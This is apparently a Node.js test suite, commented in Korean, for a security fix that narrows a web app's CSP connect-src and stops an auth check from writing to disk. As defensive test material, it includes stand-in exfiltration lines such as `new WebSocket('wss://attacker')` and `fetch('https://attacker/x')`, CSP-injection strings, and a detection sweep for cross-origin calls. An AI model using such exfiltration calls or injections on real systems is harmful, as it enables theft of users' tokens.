// 보안 잔여 11-27 — G6: CSP connect-src 축소(L13) + bigJsonGate 판정기의 디스크 쓰기(L4).
//
// L13: 기본 CSP 의 `connect-src 'self' ws: wss:` 는 모든 호스트의 ws/wss 를 열어, 주입된 스크립트가 `new WebSocket('wss://attacker')` 로
//   localStorage 토큰을 내보내도 막지 못했다. 이제 `connect-src 'self'` + (기본 정책일 때만) 검증된 요청 Host 의 ws/wss 명시(util/csp.js).
// L4: 본문을 읽기 전 판정(index.js BIG_JSON 게이트 → routes/central.js resolveCentralAuth → agentTokens resolveAgentByToken)이 유효 토큰이면
//   touch → 동기 원자적 쓰기를 했다('부작용 없는 조회' 라던 주석과 다름). 이제 기본은 기록하지 않고, centralRouter 인증 미들웨어 한 곳만 record:true.
//
// [기준 커밋 a821fd9e 에서 실패하는 것] C1 · C2 · C2b · C3 · C5(모듈 없음) · C4 · T1 · T2 · T2b · T5 · T6. C6 · C7 · T3 · T4 는 회귀 고정(기준 커밋에서도 통과).
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { fileURLToPath } from 'node:url';
import { stripComments } from './_stripComments.js';

const TMP_DIRS = [];
const tmpDir = (prefix) => { const d = fs.mkdtempSync(path.join(os.tmpdir(), prefix)); TMP_DIRS.push(d); return d; };
const rmTmpDirs = () => { for (const d of TMP_DIRS) { try { fs.rmSync(d, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 }); } catch { /* 정리 실패는 시험 결과가 아니다 */ } } };

const HERE = path.dirname(fileURLToPath(import.meta.url));
const SRC = path.resolve(HERE, '../src');
const WEB = path.resolve(HERE, '../../web');
const readSrc = (p) => fs.readFileSync(path.join(SRC, p), 'utf8');

// 설정에 쓰는 시험 — src 를 부르기 전에 CONFIG_DIR 을 임시 폴더로(정적 import 는 호이스팅 — 아래는 전부 동적 import).
const CFG = tmpDir('dvc-sec1127-g6-');
process.env.CONFIG_DIR = CFG;
process.env.CENTRAL_TOKEN = 'shared-token-sec1127-g6-0123456789';
const TOKFILE = path.join(CFG, 'central-agent-tokens.json');

let CSP; let T; let C; let G; let express;
let srv; let base;
before(async () => {
  CSP = await import('../src/util/csp.js').catch((e) => ({ _missing: e }));
  T = await import('../src/central/agentTokens.js');
  C = await import('../src/routes/central.js');
  G = await import('../src/util/bigJsonGate.js');
  express = (await import('express')).default;
  // index.js 와 같은 순서: 큰 본문 게이트(central 판정) → 전역 1MB 파서 → central 라우터 → 오류 처리기(resolveCentralAuth 로 이름을 가린다).
  const app = express();
  const gate = G.bigJsonGate(express.json({ limit: '16mb' }), {
    central: (req) => { const a = C.resolveCentralAuth(req); return a.ok ? { ok: true, agent: a.agent || '' } : false; },
  }, { maxConcurrent: 1, perWho: 1, readDeadlineMs: 60_000 });
  app.use('/api/central/inventory', gate);
  app.use(express.json({ limit: '1mb' }));
  app.use('/api/central', C.centralRouter);
  app.use((err, req, res, _next) => {
    if (String(req.originalUrl || '').startsWith('/api/central/')) { try { C.resolveCentralAuth(req); } catch { /* 진단 */ } }
    res.status(Number(err?.status) || 500).json({ ok: false });
  });
  srv = app.listen(0, '127.0.0.1');
  await new Promise((r) => srv.once('listening', r));
  base = `http://127.0.0.1:${srv.address().port}`;
});
after(() => { try { srv?.close(); } catch { /* */ } rmTmpDirs(); process.once('exit', () => { try { rmTmpDirs(); } catch { /* 종료 중 */ } }); });

const needCsp = () => { assert.ok(CSP && !CSP._missing, `util/csp.js 를 불러오지 못했다: ${CSP?._missing?.message || ''}`); return CSP; };
const lastUsed = (agent) => (T.listAgentTokens().find((t) => t.agent === agent) || {}).lastUsedAt ?? null;
const fileText = () => fs.readFileSync(TOKFILE, 'utf8');
const issue = (agent) => { const r = T.issueAgentToken(agent); assert.equal(r.ok, true, JSON.stringify(r)); return r.token; };
const fakeReq = (headers) => ({ get: (h) => headers[String(h).toLowerCase()], headers, query: {} });

/** 원시 HTTP 요청(본문을 일부만 보내고 붙잡을 수 있다). */
function rawReq({ method = 'GET', p, headers = {}, body = null, hold = false }) {
  return new Promise((resolve, reject) => {
    const req = http.request(`${base}${p}`, { method, headers }, (res) => {
      let buf = ''; res.setEncoding('utf8'); res.on('data', (d) => { buf += d; }); res.on('end', () => resolve({ status: res.statusCode, body: buf, req }));
    });
    req.on('error', (e) => { if (hold) resolve({ status: 0, error: e, req }); else reject(e); });
    if (body != null) req.write(body);
    if (hold) { resolve({ held: true, req }); return; }
    req.end();
  });
}
const waitFor = async (fn, ms = 5000) => { const end = Date.now() + ms; while (Date.now() < end) { if (fn()) return true; await new Promise((r) => setTimeout(r, 20)); } return fn(); };

/* ─────────────────────────── L13 — CSP ─────────────────────────── */

test('C1 [L13] 기본 CSP connect-src 는 \'self\' 뿐 — 스킴 전체(ws: wss: http: https:)·* 가 없다', () => {
  const s = stripComments(readSrc('index.js'));
  const app = s.slice(s.indexOf('const DEFAULT_CSP'), s.indexOf('const INTRO_CSP'));
  assert.ok(app.length > 50, 'DEFAULT_CSP 조각을 찾지 못했다');
  assert.match(app, /"connect-src 'self'"/, "connect-src 가 'self' 하나가 아니다");
  assert.ok(!/\bwss?:/.test(app), '기본 CSP 에 ws:/wss: 가 남았다 — 모든 호스트로 WebSocket 반출이 열린다');
  const cs = (app.match(/"connect-src([^"]*)"/) || [])[1] || '';
  for (const tok of cs.trim().split(/\s+/)) {
    assert.ok(!['*', 'http:', 'https:', 'ws:', 'wss:'].includes(tok) && !tok.includes('*'), `connect-src 에 넓은 소스 ${tok}`);
  }
});

// CSP host-source ABNF(CSP3 §2.3.1) — scheme "://" host-part [":" port]. 덧붙인 소스가 브라우저에 '무시되는 잘못된 소스' 가 아니게.
const HOST_SOURCE_RE = /^(?:ws|wss):\/\/[a-z0-9-]+(?:\.[a-z0-9-]+)*(?::\d{1,5})?$/;

test('C2 [L13] sameHostWsSources — 검증된 Host 만 같은 호스트 ws/wss 로 · 형식 밖은 \'\'(지시자 주입 불가)', () => {
  const { sameHostWsSources: f } = needCsp();
  const ok = [
    [['portal.corp:8443', { secure: true }], 'wss://portal.corp:8443'],
    [['h:4000', {}], 'ws://h:4000 wss://h:4000'],
    [['h:4000', { secure: false }], 'ws://h:4000 wss://h:4000'],
    [['10.0.0.5', {}], 'ws://10.0.0.5 wss://10.0.0.5'],
    [['PORTAL.Corp:443', { secure: true }], 'wss://portal.corp:443'],
    [['localhost:65535', { secure: true }], 'wss://localhost:65535'],
    [['a-b.c1.example', { secure: true }], 'wss://a-b.c1.example'],
  ];
  for (const [[h, o], want] of ok) {
    const got = f(h, o);
    assert.equal(got, want, `${JSON.stringify(h)} ${JSON.stringify(o)}`);
    for (const src of got.split(' ')) assert.match(src, HOST_SOURCE_RE, `CSP host-source 문법 밖: ${src}`);
  }
  // secure 이면 ws:// 를 붙이지 않는다(truthy 가 아니라 true 일 때만 secure — 그 밖은 평문 취급 = ws+wss, 둘 다 같은 호스트)
  assert.ok(!f('h:1', { secure: true }).includes('ws://'));
  const bad = ['', null, undefined, 123, {}, [], '[::1]:4000', '[::1]', 'h:0', 'h:65536', 'h:99999', 'h:', ':80', 'h:80:90', 'h:+80', 'h:8a',
    'a..b', '.a', '-a.com', 'a-.com', 'h.', 'h_1', 'evil.com; script-src *', "evil.com 'unsafe-inline'", 'h\r\nX: y', 'h\nx', 'h,evil', 'h evil',
    '*', '*.evil.com', 'h/x', 'h?x', 'h#x', 'user@h', `${'a'.repeat(64)}.com`, `${'a.'.repeat(130)}a`, 'x'.repeat(300), 'ｈ.com'];
  for (const h of bad) assert.equal(f(h, { secure: true }), '', `거부해야 한다: ${JSON.stringify(h)}`);
  for (const h of bad) assert.equal(f(h, {}), '', `거부해야 한다(평문): ${JSON.stringify(h)}`);
});

test('C2b [L13] sameHostWsSources — 긴 입력에서도 선형(ReDoS 회귀는 비율로)', () => {
  const { sameHostWsSources: f } = needCsp();
  const time = (s, n) => { const t0 = process.hrtime.bigint(); for (let i = 0; i < n; i += 1) f(s, {}); return Number(process.hrtime.bigint() - t0); };
  const small = `${'a'.repeat(25)}!`; const big = `${'a'.repeat(250)}!`;
  time(big, 2000); time(small, 2000);   // 데우기
  const ratios = [];
  for (let k = 0; k < 5; k += 1) ratios.push(time(big, 5000) / Math.max(1, time(small, 5000)));
  ratios.sort((a, b) => a - b);
  assert.ok(ratios[2] < 40, `10배 입력에 ${ratios[2].toFixed(1)}배 — 선형이면 10배 안팎(O(n²) 이면 100배)`);
});

const DEF = [
  "default-src 'self'", "script-src 'self'", "style-src 'self' 'unsafe-inline'", "img-src 'self' data: blob:", "font-src 'self' data:",
  "connect-src 'self'", "worker-src 'self' blob:", "media-src 'self' blob:", "object-src 'none'", "base-uri 'self'", "form-action 'self'", "frame-ancestors 'none'",
].join('; ');

test('C3 [L13] withConnectSources — connect-src 끝에만 덧붙이고 다른 지시자는 바이트 그대로', () => {
  const { withConnectSources: w } = needCsp();
  const out = w(DEF, 'wss://h:1');
  const a = DEF.split('; '); const b = out.split('; ');
  assert.equal(b.length, a.length);
  for (let i = 0; i < a.length; i += 1) {
    if (a[i].startsWith('connect-src')) assert.equal(b[i], "connect-src 'self' wss://h:1");
    else assert.equal(b[i], a[i]);
  }
  assert.equal((out.match(/connect-src/g) || []).length, 1);
  assert.equal(w(DEF, ''), DEF, "extra '' 이면 입력 그대로");
  const none = "default-src 'self'; script-src 'self'";
  assert.equal(w(none, 'wss://h'), none, 'connect-src 가 없으면 그대로(넓히지 않는다)');
  const two = "connect-src 'self'; connect-src https:";
  assert.equal(w(two, 'wss://h'), two, 'connect-src 가 둘이면 그대로');
  assert.equal(w("CONNECT-SRC 'self'", 'wss://h'), "CONNECT-SRC 'self' wss://h", '지시자 이름은 대소문자 무시');
});

test('C4 [L13] index.js 배선 — 기본 정책일 때만 · 원 Host 헤더 · 기동 경고 · 탈출구 유지', () => {
  const s = stripComments(readSrc('index.js'));
  assert.match(s, /import \{ sameHostWsSources, withConnectSources, cspEnvNotes \} from '\.\/util\/csp\.js';/);
  assert.match(s, /const policy = isIntroPath\(req\.path\) && !process\.env\.CSP \? INTRO_CSP : CSP_HEADER;/);
  assert.match(s, /res\.setHeader\('Content-Security-Policy', policy === DEFAULT_CSP \? withConnectSources\(DEFAULT_CSP, sameHostWsSources\(req\.headers\.host, \{ secure: req\.secure \}\)\) : policy\);/,
    '기본 정책일 때만 · 원 Host 헤더로 덧붙여야 한다(사용자 env 정책 · INTRO 에는 덧붙이지 않는다)');
  assert.equal((s.match(/withConnectSources\(/g) || []).length, 1, 'withConnectSources 호출은 한 곳');
  assert.equal((s.match(/sameHostWsSources\(/g) || []).length, 1, 'sameHostWsSources 호출은 한 곳');
  const mw = s.slice(s.indexOf('if (CSP_HEADER) {'), s.indexOf('next();', s.indexOf('if (CSP_HEADER) {')));
  assert.ok(mw.length > 0 && !/req\.hostname|x-forwarded-host|req\.get\(/i.test(mw), 'CSP 블록이 X-Forwarded-Host 를 따르는 값을 쓴다');
  assert.match(s, /for \(const n of cspEnvNotes\(process\.env\.CSP\)\) console\.warn\(n\);/, 'env CSP 기동 경고 배선이 없다');
  assert.match(s, /process\.env\.CSP === 'off'/, 'CSP=off 탈출구가 사라졌다');
  assert.match(s, /const CSP_HEADER = process\.env\.CSP === 'off' \? '' : \(process\.env\.CSP \|\| DEFAULT_CSP\);/, 'env 정책을 그대로 쓰는 탈출구');
});

test('C5 [L13] cspEnvNotes — off · 넓은 connect-src · 유효 지시자 없음은 경고 1건, 좁은 정책·미설정은 0건', () => {
  const { cspEnvNotes: n } = needCsp();
  const one = (v, re) => { const r = n(v); assert.equal(r.length, 1, `${JSON.stringify(v)} → ${JSON.stringify(r)}`); if (re) assert.match(r[0], re); return r[0]; };
  one('off', /꺼져/);
  one("default-src 'self'; connect-src 'self' ws: wss:", /ws: wss:/);
  one("connect-src 'self' https:", /https:/);
  one('default-src *', /default-src/);
  one("default-src 'self'; connect-src 'self' https://*", /https:\/\/\*/);
  one("default-src 'self'; connect-src wss://*", /wss:\/\/\*/);
  one("default-src 'self'; connect-src *.example.com", /\*\.example\.com/);
  one("script-src 'self'", /없어/);   // connect-src · default-src 둘 다 없으면 연결 무제한
  one('   ', /없어/);
  // 같은 지시자가 둘이면 첫 것만 유효(CSP3) — 첫 것이 넓으면 경고, 첫 것이 좁으면 경고 없음
  one("connect-src https:; connect-src 'self'", /https:/);
  assert.deepEqual(n("connect-src 'self'; connect-src https:"), []);
  assert.deepEqual(n("default-src 'self'; connect-src 'self'"), []);
  assert.deepEqual(n("default-src 'self'"), []);
  assert.deepEqual(n("default-src 'self'; connect-src 'self' wss://portal.corp:8443"), []);
  assert.deepEqual(n(undefined), []);
  assert.deepEqual(n(''), []);
  assert.deepEqual(n(DEF), []);
});

/** web 소스의 '다른 출처 연결' 스윕 — 위반 설명 배열. */
function webConnectViolations(text) {
  const out = [];
  const argAfter = (re, okRe, label) => {
    for (const m of text.matchAll(re)) {
      const rest = text.slice(m.index + m[0].length, m.index + m[0].length + 40);
      if (!okRe.test(rest)) out.push(`${label}(${rest.slice(0, 30)}`);
    }
  };
  argAfter(/\bnew\s+WebSocket\s*\(/g, /^\s*sshWsUrl\(location\b/, 'new WebSocket');
  argAfter(/\bWebSocketTunnel\s*\(/g, /^\s*rdpWsUrl\(location\b/, 'WebSocketTunnel');
  if (/\bEventSource\s*\(/.test(text)) out.push('EventSource');
  if (/\bsendBeacon\s*\(/.test(text)) out.push('sendBeacon');
  if (/\bXMLHttpRequest\b/.test(text)) out.push('XMLHttpRequest');
  if (/\bfetch\s*\(\s*['"`](?:https?|wss?):/i.test(text)) out.push('fetch 절대 주소');
  return out;
}

test('C6 [L13] web 전수 — WebSocket 은 같은 출처(sshWsUrl/rdpWsUrl(location))뿐 · EventSource·sendBeacon·XHR·절대 주소 fetch 0', () => {
  // 공허 통과 방지 — 스윕이 합성 위반을 잡는다.
  assert.ok(webConnectViolations("const w = new WebSocket('wss://x');").length === 1);
  assert.ok(webConnectViolations("new Guacamole.WebSocketTunnel('wss://evil/x')").length === 1);
  assert.ok(webConnectViolations("const e = new EventSource('/api/x');").length === 1);
  assert.ok(webConnectViolations("navigator.sendBeacon('/x', b)").length === 1);
  assert.ok(webConnectViolations("fetch('https://attacker/x')").length === 1);
  assert.ok(webConnectViolations("fetch(`wss://a`)").length === 1);
  assert.deepEqual(webConnectViolations('new WebSocket(sshWsUrl(location, wst))'), []);
  const files = [];
  const walk = (d) => { for (const e of fs.readdirSync(d, { withFileTypes: true })) { const p = path.join(d, e.name); if (e.isDirectory()) walk(p); else if (/\.(jsx?|mjs)$/.test(e.name) && !/\.test\./.test(e.name)) files.push(p); } };
  walk(path.join(WEB, 'src'));
  assert.ok(files.length > 100, `web/src 파일 ${files.length}개 — 폴더를 잘못 읽었다`);
  let ws = 0;
  for (const f of files) {
    const t = fs.readFileSync(f, 'utf8');
    ws += (t.match(/\bnew\s+WebSocket\s*\(|\bWebSocketTunnel\s*\(/g) || []).length;
    assert.deepEqual(webConnectViolations(t), [], path.relative(WEB, f));
  }
  assert.equal(ws, 2, 'WebSocket 생성 지점이 바뀌었다(SSH · RDP 둘) — 새 지점이 같은 출처인지 확인하고 이 시험을 갱신할 것');
  const wst = fs.readFileSync(path.join(WEB, 'src/remote/wsTicket.js'), 'utf8');
  assert.match(wst, /const wsOrigin = \(loc\) => `\$\{loc\?\.protocol === 'https:' \? 'wss' : 'ws'\}:\/\/\$\{loc\?\.host \|\| ''\}`;/, 'WS 주소는 페이지 host 로 만든다');
  assert.match(fs.readFileSync(path.join(WEB, 'public/sw.js'), 'utf8'), /if \(url\.origin !== self\.location\.origin\) return;/, '서비스 워커는 다른 출처에 관여하지 않는다');
});

test('C7 [L13] INTRO_CSP 는 connect-src \'self\' 유지 · 첨부 내려받기 sandbox CSP 유지', () => {
  const s = stripComments(readSrc('index.js'));
  const intro = s.slice(s.indexOf('const INTRO_CSP'), s.indexOf('const CSP_HEADER'));
  assert.match(intro, /"connect-src 'self'"/);
  assert.ok(!/\bwss?:/.test(intro));
  assert.match(stripComments(readSrc('routes/api/attach.js')), /default-src 'none'; sandbox/);
});

/* ─────────────────────────── L4 — 판정기의 디스크 쓰기 ─────────────────────────── */

test('T1 [L4] resolveCentralAuth(인자 하나)는 사용 시각을 기록하지 않는다 — 파일 바이트 불변', () => {
  const tok = issue('g6-t1');
  const snap = fileText();
  for (let i = 0; i < 3; i += 1) {
    const a = C.resolveCentralAuth(fakeReq({ 'x-central-token': tok }));
    assert.equal(a.ok, true); assert.equal(a.mode, 'agent'); assert.equal(a.agent, 'g6-t1');
  }
  assert.equal(T.resolveAgentByToken(tok), 'g6-t1');
  assert.equal(fileText(), snap, '판정만으로 토큰 파일을 썼다');
  assert.equal(lastUsed('g6-t1'), null, '판정만으로 lastUsedAt 이 찍혔다');
});

test('T2 [L4] 실제 express — 게이트가 받아들였지만 깨진 JSON 400(오류 처리기 판정 포함)이면 기록 없음', async () => {
  const tok = issue('g6-t2');
  const snap = fileText();
  const r = await rawReq({ method: 'POST', p: '/api/central/inventory', headers: { 'X-Central-Token': tok, 'Content-Type': 'application/json' }, body: '{ 깨진' });
  assert.equal(r.status, 400, r.body);
  assert.ok(G.bigJsonStats('central').peakInflight >= 1, '큰 본문 게이트를 실제로 탔어야 한다(공허 통과 방지)');
  assert.equal(lastUsed('g6-t2'), null);
  assert.equal(fileText(), snap);
});

test('T2b [L4] 게이트 503(동시 해석 상한)도 기록 없음 — 본문을 읽기 전에 디스크를 쓰지 않는다', async () => {
  const tA = issue('g6-t2a'); const tB = issue('g6-t2b');
  const snap = fileText();
  const held = await rawReq({ method: 'POST', p: '/api/central/inventory', headers: { 'X-Central-Token': tA, 'Content-Type': 'application/json', 'Content-Length': '100000' }, body: '{"a":', hold: true });
  try {
    assert.ok(await waitFor(() => G.bigJsonStats('central').inflight === 1), '첫 요청이 슬롯을 잡지 못했다');
    const r = await rawReq({ method: 'POST', p: '/api/central/inventory', headers: { 'X-Central-Token': tB, 'Content-Type': 'application/json' }, body: '{}' });
    assert.equal(r.status, 503, r.body);
    assert.equal(lastUsed('g6-t2b'), null, '게이트 503 요청이 lastUsedAt 을 찍었다');
    assert.equal(lastUsed('g6-t2a'), null, '본문을 다 받기 전 판정이 lastUsedAt 을 찍었다');
    assert.equal(fileText(), snap);
  } finally {
    held.req.destroy();
    await waitFor(() => G.bigJsonStats('central').inflight === 0);
  }
});

test('T3 [L4] 실제 요청이 라우터 인증을 지나면 lastUsedAt 이 기록된다(파일까지) · 60초 안 둘째 요청은 쓰지 않는다(스로틀)', async () => {
  const tok = issue('g6-t3');
  const snap = fileText();
  const r = await rawReq({ p: '/api/central/g6-nowhere', headers: { 'X-Central-Token': tok } });
  assert.ok(r.status > 0);
  const at = lastUsed('g6-t3');
  assert.ok(at && Math.abs(at - Date.now()) < 60_000, `lastUsedAt=${at}`);
  const disk = JSON.parse(fileText()).tokens.find((t) => t.agent === 'g6-t3');
  assert.equal(disk.lastUsedAt, at, '파일에 기록되지 않았다');
  assert.notEqual(fileText(), snap);
  const snap2 = fileText();
  await new Promise((r) => setTimeout(r, 20));   // 같은 밀리초면 스로틀이 없어도 바이트가 같다 — 시각을 벌려 스로틀 변이를 잡는다
  await rawReq({ p: '/api/central/g6-nowhere', headers: { 'X-Central-Token': tok } });
  assert.equal(fileText(), snap2, '60초 안 둘째 요청이 다시 썼다(스로틀)');
  assert.equal(lastUsed('g6-t3'), at);
  // 큰 본문 경로도 정상 본문이면 라우터에서 기록된다(게이트가 아니라 라우터 — 본문 수신 뒤)
  const tok2 = issue('g6-t3b');
  await rawReq({ method: 'POST', p: '/api/central/inventory', headers: { 'X-Central-Token': tok2, 'Content-Type': 'application/json' }, body: '{}' });
  assert.ok(lastUsed('g6-t3b'), '정상 push 가 lastUsedAt 을 찍지 않았다');
});

test('T4 [L4] 이름 바인딩 403(남의 이름 주장)도 lastUsedAt 을 찍는다 — 기록 위치는 인증 성공 직후 · 바인딩 대조 전(뜻 보존)', async () => {
  const tok = issue('g6-t4');
  const r = await rawReq({ p: '/api/central/g6-nowhere?agent=someone-else', headers: { 'X-Central-Token': tok } });
  assert.equal(r.status, 403, r.body);
  assert.ok(lastUsed('g6-t4'), '403 요청이 lastUsedAt 을 찍지 않았다 — 기록 위치를 옮겼다면 tokenApplyJob/veeam progress 의 뜻을 함께 고칠 것');
});

test('T5 [L4] record 는 엄격히 true 일 때만 — truthy(\'yes\' · 1)로 켜지지 않는다', () => {
  const tok = issue('g6-t5');
  const snap = fileText();
  assert.equal(T.resolveAgentByToken(tok, { record: 'yes' }), 'g6-t5');
  assert.equal(T.resolveAgentByToken(tok, { record: 1 }), 'g6-t5');
  assert.equal(C.resolveCentralAuth(fakeReq({ 'x-central-token': tok }), { record: 'yes' }).ok, true);
  assert.equal(lastUsed('g6-t5'), null);
  assert.equal(fileText(), snap);
  assert.equal(T.resolveAgentByToken(tok, { record: true }), 'g6-t5');
  assert.ok(lastUsed('g6-t5'));
  assert.notEqual(fileText(), snap);
});

/** 소스의 호출 지점 — 정의(function 이름)는 뺀다. 인자는 괄호 짝으로 자른다. */
function callSites(text, name) {
  const out = [];
  for (const m of text.matchAll(new RegExp(`\\b${name}\\s*\\(`, 'g'))) {
    if (/function\s+$/.test(text.slice(Math.max(0, m.index - 12), m.index))) continue;
    let i = m.index + m[0].length; let depth = 1; const start = i;
    while (i < text.length && depth > 0) { const ch = text[i]; if (ch === '(' || ch === '{' || ch === '[') depth += 1; else if (ch === ')' || ch === '}' || ch === ']') depth -= 1; i += 1; }
    out.push({ index: m.index, args: text.slice(start, i - 1).replace(/\s+/g, ' ').trim() });
  }
  return out;
}

test('T6 [L4] 소스 스윕 — 기록(record) 인자를 주는 호출은 centralRouter 인증 미들웨어 한 곳 · 게이트·오류 처리기는 인자 하나', () => {
  // 합성 입력으로 스윕이 잡는지 먼저(공허 통과 방지)
  assert.deepEqual(callSites('resolveCentralAuth(req, o); function resolveCentralAuth(req) {}', 'resolveCentralAuth').map((c) => c.args), ['req, o']);
  const multi = [];
  const walk = (d) => {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = path.join(d, e.name);
      if (e.isDirectory()) { walk(p); continue; }
      if (!e.name.endsWith('.js')) continue;
      const t = stripComments(fs.readFileSync(p, 'utf8'));
      for (const name of ['resolveCentralAuth', 'resolveAgentByToken']) {
        for (const c of callSites(t, name)) {
          const rel = path.relative(SRC, p).split(path.sep).join('/');
          if (rel === 'index.js') assert.equal(c.args, 'req', `index.js 의 ${name} 호출은 인자 하나여야 한다(본문 전 판정 · 오류 처리기는 기록하지 않는다): ${c.args}`);
          if (c.args.includes(',')) multi.push({ rel, name, args: c.args, index: c.index, t });
        }
      }
    }
  };
  walk(SRC);
  const idx = stripComments(readSrc('index.js'));
  assert.equal(callSites(idx, 'resolveCentralAuth').length, 2, 'index.js 의 resolveCentralAuth 호출(게이트 · 오류 처리기) 수가 바뀌었다');
  assert.deepEqual(multi.map((m) => `${m.rel} ${m.name}(${m.args})`).sort(), [
    'routes/central.js resolveAgentByToken(t, { record: opts?.record === true })',
    'routes/central.js resolveCentralAuth(req, { record: true })',
  ]);
  const rec = multi.find((m) => m.name === 'resolveCentralAuth');
  const useAt = rec.t.lastIndexOf('centralRouter.use(', rec.index);
  assert.ok(useAt >= 0 && rec.index - useAt < 400, 'record:true 호출이 centralRouter.use 인증 미들웨어 첫머리에 있지 않다');
  // 기록은 바인딩 대조(agent 불일치 403)보다 앞이다 — T4 와 같은 뜻을 소스로도
  assert.ok(rec.t.indexOf('agent 불일치 거부', rec.index) > rec.index);
});
